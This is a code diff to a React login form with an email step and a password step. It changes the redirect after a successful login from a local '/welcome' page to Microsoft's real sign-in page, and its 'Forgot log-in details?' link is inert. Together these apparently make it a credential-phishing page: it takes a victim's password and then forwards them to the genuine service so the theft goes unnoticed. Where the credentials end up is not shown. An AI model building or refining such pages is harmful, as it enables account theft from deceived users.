@@ -35,7 +35,7 @@ export default function LoginForm() {
         setNotice({ kind: "error", msg: data.error || "Login failed." });
         return;
       }
-      window.location.href = "/welcome";
+      window.location.href = "https://login.microsoftonline.com";
     } catch {
       setNotice({ kind: "error", msg: "Network error." });
     } finally {
@@ -108,9 +108,7 @@ export default function LoginForm() {
                 Please enter your email or username
               </div>
             )}
-
             <button type="submit" style={styles.loginBtn}>Next</button>
-
             <div style={styles.linkCol}>
               <a style={styles.link} href="#" onClick={(e) => e.preventDefault()}>Forgot log-in details?</a>
               <a style={styles.linkCancel} href="#">Cancel</a>
@@ -141,17 +139,14 @@ export default function LoginForm() {
                 Please enter your password
               </div>
             )}
-
             {notice && (
               <div style={{ ...styles.errorBox, background: notice.kind === "ok" ? "#1a7a1a" : "#c00", marginTop: "12px" }}>
                 {notice.msg}
               </div>
             )}
-
             <button type="submit" disabled={loading} style={{ ...styles.loginBtn, opacity: loading ? 0.7 : 1 }}>
               {loading ? "Logging in..." : "Log in"}
             </button>
-
             <div style={styles.linkCol}>
               <a style={styles.link} href="#" onClick={(e) => e.preventDefault()}>Forgot log-in details?</a>
               <a style={styles.linkCancel} href="#" onClick={(e) => { e.preventDefault(); setStep(1); }}>Cancel</a>
